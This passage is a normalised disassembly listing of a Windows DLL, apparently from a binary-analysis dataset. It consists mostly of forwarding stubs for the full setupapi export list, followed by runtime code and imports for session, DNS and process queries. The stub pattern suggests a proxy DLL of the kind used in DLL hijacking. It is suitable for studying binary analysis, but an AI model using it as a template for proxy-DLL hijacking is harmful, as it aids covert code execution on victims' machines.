jmp eax
SetupGetSourceFileSizeW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetSourceInfoA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetSourceInfoW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetStringFieldA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetStringFieldW
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetTargetPathA
mov ecx r--data
call sub_100013c7
jmp eax
SetupGetTargetPathW
mov ecx r--data
call sub_100013c7
jmp eax
SetupInitDefaultQueueCallback
mov ecx r--data
call sub_100013c7
jmp eax
SetupInitDefaultQueueCallbackEx
mov ecx r--data
call sub_100013c7
jmp eax
SetupInitializeFileLogA
mov ecx r--data
call sub_100013c7
jmp eax
SetupInitializeFileLogW
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallFileA
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallFileExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallFileExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallFileW
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallFilesFromInfSectionA
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallFilesFromInfSectionW
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallFromInfSectionA
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallFromInfSectionW
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallServicesFromInfSectionA
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallServicesFromInfSectionExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallServicesFromInfSectionExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupInstallServicesFromInfSectionW
mov ecx r--data
call sub_100013c7
jmp eax
SetupIterateCabinetA
mov ecx r--data
call sub_100013c7
jmp eax
SetupIterateCabinetW
mov ecx r--data
call sub_100013c7
jmp eax
SetupLogErrorA
mov ecx r--data
call sub_100013c7
jmp eax
SetupLogErrorW
mov ecx r--data
call sub_100013c7
jmp eax
SetupLogFileA
mov ecx r--data
call sub_100013c7
jmp eax
SetupLogFileW
mov ecx r--data
call sub_100013c7
jmp eax
SetupOpenAppendInfFileA
mov ecx r--data
call sub_100013c7
jmp eax
SetupOpenAppendInfFileW
mov ecx r--data
call sub_100013c7
jmp eax
SetupOpenFileQueue
mov ecx r--data
call sub_100013c7
jmp eax
SetupOpenInfFileA
mov ecx r--data
call sub_100013c7
jmp eax
SetupOpenInfFileW
mov ecx r--data
call sub_100013c7
jmp eax
SetupOpenLog
mov ecx r--data
call sub_100013c7
jmp eax
SetupOpenMasterInf
mov ecx r--data
call sub_100013c7
jmp eax
SetupPrepareQueueForRestoreA
mov ecx r--data
call sub_100013c7
jmp eax
SetupPrepareQueueForRestoreW
mov ecx r--data
call sub_100013c7
jmp eax
SetupPromptForDiskA
mov ecx r--data
call sub_100013c7
jmp eax
SetupPromptForDiskW
mov ecx r--data
call sub_100013c7
jmp eax
SetupPromptReboot
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryDrivesInDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryDrivesInDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryFileLogA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryFileLogW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryInfFileInformationA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryInfFileInformationW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryInfOriginalFileInformationA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryInfOriginalFileInformationW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryInfVersionInformationA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueryInfVersionInformationW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQuerySourceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQuerySourceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQuerySpaceRequiredOnDriveA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQuerySpaceRequiredOnDriveW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueCopyA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueCopyIndirectA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueCopyIndirectW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueCopySectionA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueCopySectionW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueCopyW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueDefaultCopyA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueDefaultCopyW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueDeleteA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueDeleteSectionA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueDeleteSectionW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueDeleteW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueRenameA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueRenameSectionA
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueRenameSectionW
mov ecx r--data
call sub_100013c7
jmp eax
SetupQueueRenameW
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveFileLogEntryA
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveFileLogEntryW
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveFromDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveFromDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveFromSourceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveFromSourceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveInstallSectionFromDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveInstallSectionFromDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveSectionFromDiskSpaceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupRemoveSectionFromDiskSpaceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupRenameErrorA
mov ecx r--data
call sub_100013c7
jmp eax
SetupRenameErrorW
mov ecx r--data
call sub_100013c7
jmp eax
SetupScanFileQueue
mov ecx r--data
call sub_100013c7
jmp eax
SetupScanFileQueueA
mov ecx r--data
call sub_100013c7
jmp eax
SetupScanFileQueueW
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetDirectoryIdA
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetDirectoryIdExA
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetDirectoryIdExW
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetDirectoryIdW
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetFileQueueAlternatePlatformA
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetFileQueueAlternatePlatformW
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetFileQueueFlags
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetNonInteractiveMode
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetPlatformPathOverrideA
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetPlatformPathOverrideW
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetSourceListA
mov ecx r--data
call sub_100013c7
jmp eax
SetupSetSourceListW
mov ecx r--data
call sub_100013c7
jmp eax
SetupTermDefaultQueueCallback
mov ecx r--data
call sub_100013c7
jmp eax
SetupTerminateFileLog
mov ecx r--data
call sub_100013c7
jmp eax
SetupUninstallNewlyCopiedInfs
mov ecx r--data
call sub_100013c7
jmp eax
SetupUninstallOEMInfA
mov ecx r--data
call sub_100013c7
jmp eax
SetupUninstallOEMInfW
mov ecx r--data
call sub_100013c7
jmp eax
SetupVerifyInfFileA
mov ecx r--data
call sub_100013c7
jmp eax
SetupVerifyInfFileW
mov ecx r--data
call sub_100013c7
jmp eax
UnicodeToMultiByte
mov ecx r--data
call sub_100013c7
jmp eax
VerifyCatalogFile
mov ecx r--data
call sub_100013c7
jmp eax
pSetupAccessRunOnceNodeList
mov ecx r--data
call sub_100013c7
jmp eax
pSetupAcquireSCMLock
mov ecx r--data
call sub_100013c7
jmp eax
pSetupAddMiniIconToList
mov ecx r--data
call sub_100013c7
jmp eax
pSetupAddTagToGroupOrderListEntry
mov ecx r--data
call sub_100013c7
jmp eax
pSetupAppendStringToMultiSz
mov ecx r--data
call sub_100013c7
jmp eax
pSetupCaptureAndConvertAnsiArg
mov ecx r--data
call sub_100013c7
jmp eax
pSetupCenterWindowRelativeToParent
mov ecx r--data
call sub_100013c7
jmp eax
pSetupConcatenatePaths
mov ecx r--data
call sub_100013c7
jmp eax
pSetupDestroyRunOnceNodeList
mov ecx r--data
call sub_100013c7
jmp eax
pSetupDiGetDeviceInfoContext
mov ecx r--data
call sub_100013c7
jmp eax
pSetupDiSetDeviceInfoContext
mov ecx r--data
call sub_100013c7
jmp eax
pSetupDoesUserHavePrivilege
mov ecx r--data
call sub_100013c7
jmp eax
pSetupDuplicateString
mov ecx r--data
call sub_100013c7
jmp eax
pSetupEnablePrivilege
mov ecx r--data
call sub_100013c7
jmp eax
pSetupFree
mov ecx r--data
call sub_100013c7
jmp eax
pSetupFreeStringArray
mov ecx r--data
call sub_100013c7
jmp eax
pSetupGetCurrentDriverSigningPolicy
mov ecx r--data
call sub_100013c7
jmp eax
pSetupGetField
mov ecx r--data
call sub_100013c7
jmp eax
pSetupGetFileTitle
mov ecx r--data
call sub_100013c7
jmp eax
pSetupGetGlobalFlags
mov ecx r--data
call sub_100013c7
jmp eax
pSetupGetInfSections
mov ecx r--data
call sub_100013c7
jmp eax
pSetupGetQueueFlags
mov ecx r--data
call sub_100013c7
jmp eax
pSetupGetRealSystemTime
mov ecx r--data
call sub_100013c7
jmp eax
pSetupGetVersionInfoFromImage
mov ecx r--data
call sub_100013c7
jmp eax
pSetupGuidFromString
mov ecx r--data
call sub_100013c7
jmp eax
pSetupHandleFailedVerification
mov ecx r--data
call sub_100013c7
jmp eax
pSetupInfCacheBuild
mov ecx r--data
call sub_100013c7
jmp eax
pSetupInfIsFromOemLocation
mov ecx r--data
call sub_100013c7
jmp eax
pSetupInstallCatalog
mov ecx r--data
call sub_100013c7
jmp eax
pSetupInstallStopEx
mov ecx r--data
call sub_100013c7
jmp eax
pSetupIsGuidNull
mov ecx r--data
call sub_100013c7
jmp eax
pSetupIsLocalSystem
mov ecx r--data
call sub_100013c7
jmp eax
pSetupIsUserAdmin
mov ecx r--data
call sub_100013c7
jmp eax
pSetupMakeSurePathExists
mov ecx r--data
call sub_100013c7
jmp eax
pSetupMalloc
mov ecx r--data
call sub_100013c7
jmp eax
pSetupModifyGlobalFlags
mov ecx r--data
call sub_100013c7
jmp eax
pSetupMultiByteToUnicode
mov ecx r--data
call sub_100013c7
jmp eax
pSetupOpenAndMapFileForRead
mov ecx r--data
call sub_100013c7
jmp eax
pSetupOutOfMemory
mov ecx r--data
call sub_100013c7
jmp eax
pSetupQueryMultiSzValueToArray
mov ecx r--data
call sub_100013c7
jmp eax
pSetupRealloc
mov ecx r--data
call sub_100013c7
jmp eax
pSetupRegistryDelnode
mov ecx r--data
call sub_100013c7
jmp eax
pSetupRetrieveServiceConfig
mov ecx r--data
call sub_100013c7
jmp eax
pSetupSetArrayToMultiSzValue
mov ecx r--data
call sub_100013c7
jmp eax
pSetupSetGlobalFlags
mov ecx r--data
call sub_100013c7
jmp eax
pSetupSetNoDriverPrompts
mov ecx r--data
call sub_100013c7
jmp eax
pSetupSetQueueFlags
mov ecx r--data
call sub_100013c7
jmp eax
pSetupSetSystemSourcePath
mov ecx r--data
call sub_100013c7
jmp eax
pSetupShouldDeviceBeExcluded
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringFromGuid
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableAddString
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableAddStringEx
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableDestroy
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableDuplicate
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableEnum
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableGetExtraData
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableInitialize
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableInitializeEx
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableLookUpString
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableLookUpStringEx
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableSetExtraData
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableStringFromId
mov ecx r--data
call sub_100013c7
jmp eax
pSetupStringTableStringFromIdEx
mov ecx r--data
call sub_100013c7
jmp eax
pSetupUnicodeToMultiByte
mov ecx r--data
call sub_100013c7
jmp eax
pSetupUnmapAndCloseFile
mov ecx r--data
call sub_100013c7
jmp eax
pSetupVerifyCatalogFile
mov ecx r--data
call sub_100013c7
jmp eax
pSetupVerifyFile
mov ecx r--data
call sub_100013c7
jmp eax
pSetupVerifyQueuedCatalogs
mov ecx r--data
call sub_100013c7
jmp eax
pSetupWriteLogEntry
mov ecx r--data
call sub_100013c7
jmp eax
pSetupWriteLogError
mov ecx r--data
call sub_100013c7
jmp eax
sub_10003d56
xor eax eax
inc eax
retn
sub_10003d5a
mov esp [ ebp - 0x18 ]
call sub_1001265d
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
inc eax
sub_10003d6c
call sub_1001cf54
retn 0x4
sub_100045fc
mov eax [ ecx ]
call [ eax + 0xc ]
test eax eax
je r-xdata
retn
mov ecx [ eax + 0x3c ]
mov ecx [ ecx + eax + 0x28 ]
push 0x0
push 0x1
push eax
add ecx eax
call ecx
sub_10004943
mov eax [ ecx + 0x10 ]
retn
sub_100049d2
and [ eax + 0x14 ] 0x0
and [ eax + 0x10 ] 0x0
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
retn
sub_100058a8
push [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
push [ esp + 0x14 ]
call sub_10006dde
sub eax [ esp + 0x14 ]
pop ecx
neg eax
sbb eax eax
pop ecx
inc eax
retn 0x10
sub_100064d8
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000b6da
pop ecx
sub_100084e6
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
retn
sub_10009214
push esi
mov esi ecx
call sub_100091f5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000b6da
pop ecx
sub_1000958b
push esi
mov esi ecx
call sub_100095a7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000b6da
pop ecx
sub_10009988
mov eax r-xdata
retn
sub_10009dc1
push esi
mov esi ecx
call sub_10009ddd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000b6da
pop ecx
sub_1000a260
cmp [ esp + 0x8 ] 0x0
mov eax 0xcc0020
je r-xdata
push eax
mov eax [ esp + 0x8 ]
add eax 0x10
push eax
call [ InterlockedExchange@IAT ]
retn 0x8
mov eax 0x40cc0020
sub_1000a7df
xor eax eax
inc eax
retn
sub_1000a91f
xor eax eax
inc eax
retn
sub_1000a9d5
xor eax eax
inc eax
retn
sub_1000ac5e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000b786
sub_1000b36c
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_10010a9b
add esp 0xc
pop ebp
retn
sub_1000b382
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000b36c
sub_1000b38d
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_10010d7a
add esp 0xc
pop ebp
retn
sub_1000b4a0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b407
add esp 0x10
pop ebp
retn
sub_1000b5db
call sub_10011c5e
retn
sub_1000b5e1
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1000b5a5
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_1000b6da
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000bf59
sub_1000b71c
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_100121f5
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_1000b737
mov [ ecx ] r--data
jmp sub_1001226f
sub_1000b769
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10012212
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000b7eb
mov edi edi
sub_1000b7ed
push ecx
mov [ ecx ] r--data
call sub_10012336
pop ecx
retn
sub_1000bde5
push 0xc
push r--data
call sub_10011ecc
call sub_1000e343
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_1000bda8
sub_1000be1a
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_10011e59
int3
sub_1000bfaf
push 0x4
call sub_10012924
pop ecx
retn
sub_1000c02d
push 0x4
call sub_10012924
pop ecx
retn
sub_1000c1d4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c100
add esp 0x14
pop ebp
retn
sub_1000c530
push 0xc
call sub_10012924
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1000d15e
push 0xc
call sub_10012924
pop ecx
retn
sub_1000d16a
push 0xc
call sub_10012924
pop ecx
retn
sub_1000d19b
and [ esi + 0x70 ] 0xffffffef
retn
sub_1000d1a0
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000b6da
sub_1000d5e7
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_100127be
pop ecx
pop ecx
retn
sub_1000d89d
push 0xc
push r--data
call sub_10011ecc
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10011f11
retn
sub_1000d8ba
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1000d94f
call sub_1000d8ed
mov [ rw-data ] eax
xor eax eax
retn
sub_1000dc1d
push 0xd
call sub_10012924
pop ecx
retn
sub_1000dfe8
push 0xd
call sub_10012924
pop ecx
retn
sub_1000e021
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_1000de87
pop ecx
mov [ rw-data ] 0x1
sub_1000e12c
call [ TlsAlloc@IAT ]
retn 0x4
sub_1000e135
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_1000e14f
mov eax [ rw-data ]
retn
sub_1000e189
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_1000e0ba
pop ecx
call eax
pop ebp
retn 0x8
sub_1000e2b8
push 0xd
call sub_10012924
pop ecx
retn
sub_1000e2c1
push 0xc
call sub_10012924
pop ecx
retn
sub_1000e477
push 0xd
call sub_10012924
pop ecx
retn
sub_1000e483
push 0xc
call sub_10012924
pop ecx
retn
sub_1000e73c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10011bb0
push 0x4
call sub_10012924
pop ecx
retn
sub_10011c3d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10011c12
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_10011c55
push 0x8
call sub_100129fe
pop ecx
retn
sub_10011c5e
push 0x8
call sub_10012924
pop ecx
retn
sub_10011e44
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10012924
pop ecx
sub_10011e59
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_10011d2d
add esp 0xc
pop ebp
retn
sub_10011e6f
push 0x1
push 0x0
push 0x0
call sub_10011d2d
add esp 0xc
retn
sub_10011f11
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_100121f5
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_1001226f
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_1000bf59
pop ecx
sub_10012285
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_100122b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001239d
push 0xe
call sub_10012924
pop ecx
retn
sub_1001262b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_1001265d
retn
sub_10012924
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100129f5
push 0xa
call sub_10012924
pop ecx
retn
sub_10014607
xor eax eax
retn
sub_10016a8b
call sub_1001a90f
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_1000bf59
pop ecx
retn
call sub_1001a6e6
sub_10016dc6
xor eax eax
inc eax
retn
sub_10017377
and [ rw-data ] 0x0
retn
sub_10017a54
push [ ebp + 0x8 ]
call sub_1001ab5e
pop ecx
retn
sub_10018263
push [ ebp + 0x8 ]
call sub_1001ab5e
pop ecx
retn
sub_1001836d
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_100184ef
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018383
add esp 0x14
pop ebp
retn
sub_10018544
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1001850c
pop ecx
pop ecx
pop ebp
retn
sub_10018e92
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018d7b
add esp 0x10
pop ebp
retn
sub_1001930a
push 0x4
call sub_10012924
pop ecx
retn
sub_10019470
push 0x4
call sub_10012924
pop ecx
retn
sub_100195c2
push 0x8
push r--data
call sub_10011ecc
call sub_1000e343
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1001b4d1
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_100195e2
xor eax eax
inc eax
retn
sub_100195fb
call sub_1000e343
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_100195c2
call eax
sub_10019632
xor eax eax
inc eax
retn
sub_10019646
push sub_100195c2
call sub_1000e03f
pop ecx
mov [ rw-data ] eax
retn
sub_10019657
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_100196ac
push [ rw-data ]
call sub_1000e0ba
pop ecx
retn
sub_1001982d
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_10012924
pop ecx
sub_10019869
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100199f7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10019a06
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10019a36
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_10019a4d
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10011f11
retn
push 0x8
call [ SetLastError@IAT ]
sub_10019b4e
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10019a78
add esp 0xc
pop ebp
retn 0x4
sub_10019b81
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_1001b8ad
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10019bb4
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10019a78
add esp 0xc
pop ebp
retn 0x8
sub_1001a250
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1001ac50
sub_1001a266
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1001ac50
sub_1001a27c
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_1001aeb3
add esp 0xc
pop ebp
retn
sub_1001a77c
push 0x1
call sub_10012924
pop ecx
retn
sub_1001a8d7
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10016b5a
pop ecx
pop ecx
retn
sub_1001a906
push 0x1
call sub_10012924
pop ecx
retn
sub_1001a90f
push 0x1
call sub_1001a835
pop ecx
retn
sub_1001a96b
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_1001a918
add esp 0x10
pop ebp
retn
sub_1001ab55
push 0xa
call sub_10012924
pop ecx
retn
sub_1001ac7b
push 0x2
call sub_10011be9
pop ecx
retn
sub_1001b228
push [ ebp + 0xc ]
call sub_10016b1e
pop ecx
retn
sub_1001b881
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1001b7b8
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1001b8cc
call eax
retn
sub_1001bb5c
push esi
call sub_10016b1e
pop ecx
retn
sub_1001bc3b
push [ ebp + 0x8 ]
call sub_1001ab5e
pop ecx
retn
sub_1001bc45
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_1001c346
push [ ebp + 0x8 ]
call sub_1001ab5e
pop ecx
retn
sub_1001c4af
push [ ebp + 0x8 ]
call sub_1001ab5e
pop ecx
retn
sub_1001c4f0
lea eax [ edx - 0x1 ]
pop ebx
retn
WTSQuerySessionInformationW
jmp [ WTSQuerySessionInformationW@IAT ]
WTSFreeMemory
jmp [ WTSFreeMemory@IAT ]
shutdown
jmp [ shutdown@IAT ]
DnsFree
jmp [ DnsFree@IAT ]
DnsQuery_W
jmp [ DnsQuery_W@IAT ]
EnumProcessModules
jmp [ EnumProcessModules@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_1001ce75
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1001ce89
mov eax sub_1001e724
mov [ rw-data ] eax
mov [ rw-data ] sub_1001de0b
mov [ rw-data ] sub_1001ddbf
mov [ rw-data ] sub_1001ddf8
mov [ rw-data ] sub_1001dd61
mov [ rw-data ] eax
mov [ rw-data ] sub_1001e69c
mov [ rw-data ] sub_1001dd7d
mov [ rw-data ] sub_1001dcdf
mov [ rw-data ] sub_1001dc6c
retn
sub_1001cee9
mov edi edi
push ebp
mov ebp esp
call sub_1001ce89
call sub_1001e7b0
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_1001e747
sub_1001cf54
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_1000ac69
jmp sub_10011f11
sub_1001cf81
mov [ ecx ] r--data
jmp sub_1001226f
sub_1001d0dd
